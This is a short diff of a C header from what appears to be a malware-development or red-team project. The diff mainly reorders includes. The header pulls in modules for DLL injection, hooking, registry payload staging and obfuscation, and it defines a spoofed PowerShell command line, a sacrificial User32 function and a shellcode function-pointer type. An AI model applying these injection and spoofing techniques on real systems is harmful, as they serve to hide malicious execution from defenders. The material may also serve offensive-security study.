@@ -10,28 +10,25 @@
 #include "peImageParser.h"
 #include "dllinjection.h"
 #include "Hooks.h"
-
+#include "WebRetrival.h"
 #ifdef __cplusplus
 extern "C"
 {
 #endif
-
-
 	#include "RegstryPayloadStaging.h"
 	#include "Obfuscation.h"
-	#include "WebRetrival.h"
 	#include "UserInput.h"
 	#include "Printers.h"
 	#include "ErrorHandlers.h"
 	#include "Win32FindDataArray.h"
+	#include "Encryption.h"
 
- // If this header is for C code
-#include "Encryption.h"
+
+
 	#define		SACRIFICIAL_DLL          "User32.dll"
 	#define		SACRIFICIAL_FUNC         "MessageBoxA"
 	#define     SPOOFED_COMMAND_LINE     L"powershell.exe Totally Legit Argument"
 	#define		MALICIOUS_COMMAND_LINE   L"powershell.exe -NoExit calc.exe"
-
 
 	typedef  VOID(WINAPI* fnShellCode)();
 
